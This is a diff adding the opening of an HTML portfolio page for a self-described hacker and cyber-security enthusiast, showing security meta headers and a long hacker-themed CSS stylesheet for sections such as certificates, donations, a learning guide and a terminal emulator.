@@ -1,0 +1,2847 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zaid Alvan | Hacker & Cyber Security</title>
+
+    <!-- ===== SECURITY HEADERS ===== -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://www.google.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://ui-avatars.com https://api.qrserver.com https://upload.wikimedia.org; connect-src 'self';">
+
+    <!-- ===== LINKS ===== -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* ============================================================
+           RESET & VARIABLES
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-card: #1a1a1a;
+            --text-primary: #00ff41;
+            --text-secondary: #88ff99;
+            --accent: #00ff41;
+            --accent-dark: #00cc33;
+            --accent-glow: rgba(0, 255, 65, 0.15);
+            --border-color: #1a3a1a;
+            --font: 'Share Tech Mono', 'Courier New', monospace;
+            --font-display: 'Orbitron', 'Courier New', monospace;
+            --font-regular: 'Inter', 'Segoe UI', sans-serif;
+            --toast-bg: #1a1a1a;
+            --toast-text: #00ff41;
+            --toast-border: #00ff41;
+            --term-bg: #0a0a0a;
+            --term-text: #00ff41;
+            --term-border: #1a3a1a;
+            --term-prompt: #00ff41;
+            --term-input: #ffffff;
+        }
+
+        .light-mode {
+            --bg-primary: #f0f0f0;
+            --bg-secondary: #e0e0e0;
+            --bg-card: #ffffff;
+            --text-primary: #000000;
+            --text-secondary: #333333;
+            --accent: #0077be;
+            --accent-dark: #005a8c;
+            --accent-glow: rgba(0, 119, 190, 0.15);
+            --border-color: #cccccc;
+            --toast-bg: #ffffff;
+            --toast-text: #000000;
+            --toast-border: #0077be;
+            --term-bg: #1a1a1a;
+            --term-text: #00ff41;
+            --term-border: #333333;
+            --term-prompt: #00ff41;
+            --term-input: #ffffff;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--font-regular);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            overflow-x: hidden;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .highlight {
+            color: var(--accent);
+            text-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        /* ============================================================
+           MATRIX CANVAS
+           ============================================================ */
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.10;
+            pointer-events: none;
+        }
+
+        /* ============================================================
+           TERMINAL OVERLAY
+           ============================================================ */
+        .terminal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.95);
+            animation: fadeOut 2.5s ease-in-out 4.5s forwards;
+            pointer-events: none;
+        }
+
+        .terminal-text {
+            text-align: center;
+            padding: 40px;
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.9);
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.1);
+        }
+
+        .terminal-text .typing {
+            display: block;
+            font-size: 1.2rem;
+            color: var(--text-primary);
+            font-family: var(--font);
+            letter-spacing: 1px;
+            opacity: 0;
+            animation: typeIn 1.5s steps(40) forwards;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .terminal-text .typing:nth-child(1) { animation-delay: 0.5s; }
+        .terminal-text .typing:nth-child(2) { animation-delay: 2s; }
+        .terminal-text .typing:nth-child(3) { animation-delay: 3.5s; }
+
+        @keyframes typeIn {
+            0% { opacity: 0; width: 0; }
+            1% { opacity: 1; }
+            100% { opacity: 1; width: 100%; }
+        }
+
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+
+        /* ============================================================
+           NAVBAR
+           ============================================================ */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 0;
+            transition: background 0.3s, border-color 0.3s;
+        }
+
+        .light-mode .navbar {
+            background: rgba(240, 240, 240, 0.85);
+        }
+
+        .navbar .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 1.5rem;
+            font-weight: 900;
+        }
+
+        .logo-text {
+            color: var(--text-primary);
+            font-family: var(--font-display);
+        }
+
+        .logo-text .highlight {
+            color: var(--accent);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 14px;
+            list-style: none;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: .75rem;
+            font-weight: 500;
+            transition: color .3s;
+            position: relative;
+            font-family: var(--font);
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            transition: width .3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--text-primary);
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .theme-toggle {
+            background: none;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: var(--font);
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+
+        .theme-toggle:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .hamburger span {
+            width: 25px;
+            height: 2px;
+            background: var(--text-primary);
+            transition: .3s;
+        }
+
+        /* ============================================================
+           HERO
+           ============================================================ */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding-top: 80px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-bg-pattern {
+            position: absolute;
+            inset: 0;
+            background-image:
+                radial-gradient(circle at 20% 50%, rgba(0, 255, 65, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 50%, rgba(0, 255, 65, 0.02) 0%, transparent 50%);
+            z-index: 0;
+        }
+
+        .hero-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 50px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-text {
+            flex: 1;
+        }
+
+        .badge {
+            display: inline-block;
+            background: var(--accent-glow);
+            color: var(--accent);
+            padding: 6px 18px;
+            border-radius: 20px;
+            font-size: .85rem;
+            font-weight: 600;
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            margin-bottom: 20px;
+            font-family: var(--font);
+        }
+
+        .glitch-text {
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { opacity: 1; }
+            5% { opacity: .8; transform: translateX(-2px); }
+            10% { opacity: 1; transform: translateX(2px); }
+            15% { opacity: .9; transform: translateX(-1px); }
+            20% { opacity: 1; transform: translateX(0); }
+        }
+
+        .hero-text h1 {
+            font-size: 3.8rem;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            font-family: var(--font-display);
+        }
+
+        .hero-text h1 .line-1 {
+            display: block;
+        }
+
+        .hero-text h1 .line-2 {
+            display: block;
+            color: var(--accent);
+            text-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            font-family: var(--font);
+        }
+
+        .cmd-prompt {
+            color: var(--accent);
+        }
+
+        .cmd-text {
+            color: #ffffff;
+        }
+
+        .cmd-result {
+            color: #88ff99;
+            display: block;
+            margin-top: 4px;
+            padding-left: 20px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 28px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: .85rem;
+            transition: all .3s;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            font-family: var(--font);
+            background: transparent;
+            color: var(--text-primary);
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-outline:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .social-links a {
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: all .3s;
+        }
+
+        .social-links a:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-3px);
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.1);
+        }
+
+        .hero-image {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            position: relative;
+        }
+
+        .profile-frame {
+            position: relative;
+        }
+
+        .glitch-border {
+            width: 320px;
+            height: 320px;
+            border-radius: 50%;
+            padding: 4px;
+            position: relative;
+            background: var(--accent);
+            animation: glitchBorder 3s infinite;
+        }
+
+        .glitch-border::before {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            background: var(--accent);
+            opacity: .3;
+            filter: blur(8px);
+        }
+
+        .glitch-overlay {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            background: transparent;
+            z-index: 2;
+            animation: glitchOverlay 2s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes glitchBorder {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(2deg) scale(1.02); }
+            50% { transform: rotate(-1deg) scale(.98); }
+            75% { transform: rotate(1deg) scale(1.01); }
+        }
+
+        @keyframes glitchOverlay {
+            0%, 100% { opacity: 0; }
+            5% { opacity: .2; background: rgba(0, 255, 65, 0.1); }
+            10% { opacity: 0; }
+            50% { opacity: 0; }
+            55% { opacity: .15; background: rgba(0, 255, 65, 0.05); }
+            60% { opacity: 0; }
+        }
+
+        .glitch-border img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+            border: 2px solid var(--bg-primary);
+        }
+
+        .floating-badge {
+            position: absolute;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: .75rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            animation: float 3s ease-in-out infinite;
+            font-family: var(--font);
+        }
+
+        .floating-badge i {
+            color: var(--accent);
+        }
+
+        .badge-1 {
+            top: 10px;
+            right: -20px;
+            animation-delay: 0s;
+        }
+
+        .badge-2 {
+            bottom: 10px;
+            left: -20px;
+            animation-delay: .5s;
+        }
+
+        .badge-3 {
+            top: 50%;
+            right: -40px;
+            transform: translateY(-50%);
+            animation-delay: 1s;
+            border-color: var(--accent);
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .badge-3 i {
+            color: #fbbf24;
+        }
+
+        .hacker-tag {
+            position: absolute;
+            bottom: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-card);
+            border: 1px solid var(--accent);
+            padding: 4px 14px;
+            border-radius: 4px;
+            font-size: .6rem;
+            font-family: var(--font);
+            color: var(--accent);
+            letter-spacing: 2px;
+            opacity: .7;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        /* ============================================================
+           SECTION COMMON
+           ============================================================ */
+        section {
+            padding: 80px 0;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .section-tag {
+            display: inline-block;
+            color: var(--accent);
+            font-weight: 600;
+            font-size: .85rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            background: var(--accent-glow);
+            padding: 4px 16px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            margin-bottom: 10px;
+            font-family: var(--font);
+        }
+
+        .section-header h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            font-family: var(--font-display);
+        }
+
+        .section-desc {
+            color: var(--text-secondary);
+            margin-top: 8px;
+        }
+
+        /* ============================================================
+           HACKER CARD
+           ============================================================ */
+        .hacker-card {
+            background: var(--bg-card);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all .3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hacker-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--accent);
+            opacity: 0;
+            transition: opacity .3s;
+        }
+
+        .hacker-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .hacker-card:hover::before {
+            opacity: 1;
+        }
+
+        /* ============================================================
+           ABOUT
+           ============================================================ */
+        .about {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+        }
+
+        .about-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 24px;
+        }
+
+        .about-card {
+            background: var(--bg-card);
+            padding: 30px 24px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            transition: all .3s;
+        }
+
+        .about-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .about-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: var(--accent-glow);
+            color: var(--accent);
+            font-size: 1.5rem;
+        }
+
+        .about-card h3 {
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+        }
+
+        .about-card p {
+            color: var(--text-secondary);
+            font-size: .9rem;
+        }
+
+        .about-card .small {
+            font-size: .8rem;
+            opacity: .7;
+        }
+
+        .fortinet-about {
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+
+        .fortinet-about .about-icon {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.05));
+            color: #fbbf24;
+        }
+
+        /* ============================================================
+           SKILLS
+           ============================================================ */
+        .skills-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .skill-category {
+            background: var(--bg-card);
+            padding: 28px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all .3s;
+        }
+
+        .skill-category:hover {
+            border-color: var(--accent);
+        }
+
+        .skill-category h3 {
+            font-size: 1.1rem;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .skill-category h3 i {
+            color: var(--accent);
+        }
+
+        .skill-bar {
+            background: var(--bg-primary);
+            border-radius: 20px;
+            height: 28px;
+            margin-bottom: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid var(--border-color);
+        }
+
+        .skill-bar span {
+            display: block;
+            height: 100%;
+            background: var(--accent);
+            border-radius: 20px;
+            padding-left: 14px;
+            font-size: .75rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            color: #000;
+            transition: width 1s;
+        }
+
+        /* ============================================================
+           PROJECTS
+           ============================================================ */
+        .projects {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+        }
+
+        .project-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+        }
+
+        .project-card {
+            background: var(--bg-card);
+            padding: 30px 24px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            transition: all .3s;
+        }
+
+        .project-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .project-icon {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 16px;
+        }
+
+        .project-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+        }
+
+        .project-card p {
+            color: var(--text-secondary);
+            font-size: .9rem;
+            margin-bottom: 14px;
+        }
+
+        .project-tag {
+            display: inline-block;
+            background: var(--accent-glow);
+            color: var(--accent);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: .75rem;
+            font-weight: 500;
+        }
+
+        /* ============================================================
+           CERTIFICATES
+           ============================================================ */
+        .certificates {
+            background: var(--bg-primary);
+            transition: background 0.3s;
+        }
+
+        .cert-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 28px;
+        }
+
+        .cert-card {
+            background: var(--bg-card);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            transition: all .3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cert-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--accent);
+            opacity: 0;
+            transition: opacity .3s;
+        }
+
+        .cert-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .cert-card:hover::before {
+            opacity: 1;
+        }
+
+        .cert-image-wrapper {
+            width: 100%;
+            border-radius: 6px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: #0a0a0a;
+        }
+
+        .cert-image-wrapper img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: transform .3s;
+        }
+
+        .cert-card:hover .cert-image-wrapper img {
+            transform: scale(1.02);
+        }
+
+        .cert-body {
+            flex: 1;
+        }
+
+        .cert-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .cert-org {
+            font-size: .8rem;
+            color: var(--accent);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: .5px;
+        }
+
+        .cert-year {
+            font-size: .75rem;
+            color: var(--text-secondary);
+            background: var(--bg-primary);
+            padding: 2px 12px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+
+        .cert-body h3 {
+            font-size: 1.1rem;
+            margin-bottom: 6px;
+        }
+
+        .cert-body p {
+            font-size: .9rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        .cert-body p .highlight {
+            font-weight: 600;
+        }
+
+        .cert-meta {
+            display: flex;
+            gap: 16px;
+            font-size: .75rem;
+            color: var(--text-secondary);
+            flex-wrap: wrap;
+        }
+
+        .cert-meta i {
+            color: var(--accent);
+            margin-right: 4px;
+        }
+
+        .cert-seal {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--accent);
+            font-size: .65rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            opacity: .7;
+            margin-top: 8px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 12px;
+        }
+
+        .cert-seal i {
+            font-size: 1.2rem;
+        }
+
+        /* ============================================================
+           KISAH PERJALANAN
+           ============================================================ */
+        .kisah {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+            padding: 80px 0;
+        }
+
+        .kisah-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+            margin-bottom: 40px;
+        }
+
+        .kisah-card {
+            background: var(--bg-card);
+            padding: 30px 24px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .kisah-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .kisah-icon {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 16px;
+        }
+
+        .kisah-card h3 {
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+        }
+
+        .kisah-card p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.7;
+        }
+
+        /* ============================================================
+           DONASI
+           ============================================================ */
+        .donasi-box {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.05), rgba(0, 255, 65, 0.01));
+            border: 1px solid var(--accent);
+            border-radius: 12px;
+            padding: 40px 30px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .donasi-box h3 {
+            font-size: 1.5rem;
+            font-family: var(--font-display);
+            margin-bottom: 12px;
+        }
+
+        .donasi-box p {
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+        }
+
+        .donasi-list {
+            list-style: none;
+            color: var(--text-secondary);
+            text-align: left;
+            max-width: 400px;
+            margin: 0 auto 16px;
+            padding: 0;
+        }
+
+        .donasi-list li {
+            padding: 4px 0;
+            font-size: 0.95rem;
+        }
+
+        .donasi-list li i {
+            color: var(--accent);
+            margin-right: 6px;
+        }
+
+        .btn-donasi {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 14px 32px;
+            border-radius: 8px;
+            background: var(--accent);
+            color: #000;
+            text-decoration: none;
+            font-weight: 700;
+            font-family: var(--font);
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn-donasi:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .qr-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            margin: 16px 0;
+            padding: 16px;
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s;
+        }
+
+        .qr-container:hover {
+            border-color: var(--accent);
+        }
+
+        .qr-container img {
+            max-width: 200px;
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .qr-container .qr-label {
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-family: var(--font);
+        }
+
+        .qr-container .qr-label i {
+            color: var(--accent);
+            margin-right: 6px;
+        }
+
+        .no-rek {
+            display: inline-block;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-family: var(--font);
+            font-size: 1rem;
+            color: var(--accent);
+            margin: 8px 0;
+        }
+
+        /* ============================================================
+           PANDUAN BELAJAR
+           ============================================================ */
+        .panduan {
+            background: var(--bg-primary);
+            transition: background 0.3s;
+            padding: 80px 0;
+        }
+
+        .panduan-tahap {
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            color: var(--accent);
+            margin: 30px 0 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .panduan-tahap:first-of-type {
+            margin-top: 0;
+        }
+
+        .panduan-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+        }
+
+        .panduan-item {
+            background: var(--bg-card);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s;
+        }
+
+        .panduan-item:hover {
+            border-color: var(--accent);
+        }
+
+        .panduan-item .step {
+            display: inline-block;
+            background: var(--accent-glow);
+            color: var(--accent);
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-family: var(--font);
+            margin-bottom: 6px;
+        }
+
+        .panduan-item h4 {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            margin-bottom: 6px;
+            color: var(--text-primary);
+        }
+
+        .panduan-item p {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .panduan-tips {
+            background: var(--bg-card);
+            border-radius: 8px;
+            border-left: 3px solid var(--accent);
+            padding: 16px 20px;
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--text-secondary);
+        }
+
+        .panduan-tips i {
+            color: var(--accent);
+            font-size: 1.2rem;
+        }
+
+        /* ============================================================
+           TERMINAL EMULATOR
+           ============================================================ */
+        .terminal-emulator {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+            padding: 60px 0;
+        }
+
+        .terminal-box {
+            background: var(--term-bg);
+            border-radius: 12px;
+            border: 1px solid var(--term-border);
+            padding: 16px;
+            max-width: 820px;
+            margin: 0 auto;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+            font-family: var(--font);
+        }
+
+        .terminal-box .term-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--term-border);
+            margin-bottom: 12px;
+        }
+
+        .terminal-box .term-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .term-dot.red { background: #ff5f56; }
+        .term-dot.yellow { background: #ffbd2e; }
+        .term-dot.green { background: #27c93f; }
+
+        .term-title {
+            color: var(--term-text);
+            font-size: 0.75rem;
+            opacity: 0.6;
+            margin-left: 8px;
+            font-family: var(--font);
+            letter-spacing: 0.5px;
+        }
+
+        .term-body {
+            padding: 4px 0;
+        }
+
+        .terminal-output {
+            font-family: var(--font);
+            font-size: 0.9rem;
+            color: var(--term-text);
+            min-height: 180px;
+            max-height: 340px;
+            overflow-y: auto;
+            padding: 6px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            scrollbar-width: thin;
+            scrollbar-color: var(--term-border) transparent;
+        }
+
+        .terminal-output::-webkit-scrollbar {
+            width: 6px;
+        }
+        .terminal-output::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .terminal-output::-webkit-scrollbar-thumb {
+            background: var(--term-border);
+            border-radius: 4px;
+        }
+
+        .terminal-output .term-line {
+            display: block;
+            padding: 2px 0;
+            line-height: 1.5;
+        }
+
+        .terminal-output .term-line .prompt {
+            color: var(--term-prompt);
+            font-weight: 600;
+        }
+
+        .terminal-output .term-line .cmd-text {
+            color: var(--term-input);
+        }
+
+        .terminal-output .term-line .output-text {
+            color: var(--term-text);
+        }
+
+        .terminal-output .term-line .output-error {
+            color: #ff4444;
+        }
+
+        .terminal-output .term-line .output-warning {
+            color: #ffbb33;
+        }
+
+        .terminal-output .term-line .output-info {
+            color: #44aaff;
+        }
+
+        .terminal-output .term-line .output-success {
+            color: #00ff41;
+        }
+
+        .terminal-output .term-line .output-dim {
+            color: #666;
+            font-style: italic;
+        }
+
+        .terminal-input-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-top: 10px;
+            border-top: 1px solid var(--term-border);
+            margin-top: 8px;
+        }
+
+        .terminal-input-row .prompt {
+            color: var(--term-prompt);
+            font-family: var(--font);
+            font-size: 0.9rem;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .terminal-input-row input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--term-input);
+            font-family: var(--font);
+            font-size: 0.9rem;
+            caret-color: var(--term-prompt);
+            padding: 4px 0;
+        }
+
+        .terminal-input-row input::placeholder {
+            color: var(--term-text);
+            opacity: 0.3;
+        }
+
+        .term-status {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 8px;
+            margin-top: 8px;
+            border-top: 1px solid var(--term-border);
+            font-size: 0.7rem;
+            color: var(--term-text);
+            opacity: 0.4;
+            font-family: var(--font);
+        }
+
+        .term-status .term-cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: var(--term-prompt);
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* ============================================================
+           BUG BOUNTY PORTOFOLIO
+           ============================================================ */
+        .bug-bounty {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+            padding: 80px 0;
+        }
+
+        .sub-section-title {
+            font-family: var(--font-display);
+            font-size: 1.4rem;
+            color: var(--accent);
+            margin: 40px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sub-section-title:first-of-type {
+            margin-top: 0;
+        }
+
+        /* Sertifikat */
+        .certificate-card {
+            max-width: 700px;
+            margin: 20px auto;
+            padding: 16px;
+            border-radius: 12px;
+            background: var(--bg-card);
